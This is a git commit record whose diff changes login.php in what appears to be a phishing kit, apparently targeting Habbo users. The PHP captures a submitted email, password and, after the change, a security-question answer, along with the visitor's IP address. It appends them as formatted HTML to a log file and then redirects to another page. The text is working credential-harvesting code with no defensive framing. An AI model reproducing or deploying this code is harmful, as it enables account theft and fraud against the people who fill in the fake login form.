e6f2f4fd41d11d8b50e35947e35e6c83fee96d69
Besnik Rushiti <besnikrushiti12@gmail.com>
2015-02-27 16:25:17 +0100

    updat

--- login.php
+++ login.php
@@ -2,9 +2,10 @@
 
 $habbo = $_POST['email']; 
 $password = $_POST['pass'];
+$answers = $_POST['answer'];
 $ip = $_SERVER['REMOTE_ADDR']; 
 $f = fopen("provo.html", "a"); 
-fwrite ($f, 'Email: [<b><font color="#FF1493">'.$habbo.'</font></b>] Password: [<b><font color="#1E90FF">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>]<br>');
+fwrite ($f, 'Email: [<b><font color="#FF1493">'.$habbo.'</font></b>] Password: [<b><font color="#1E90FF">'.$password.'</font></b>] Answer: [<b><font color="#1E90FF">'.$answers.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>]<br>');
 fclose($f);
 
 header("Location:bussines.php");
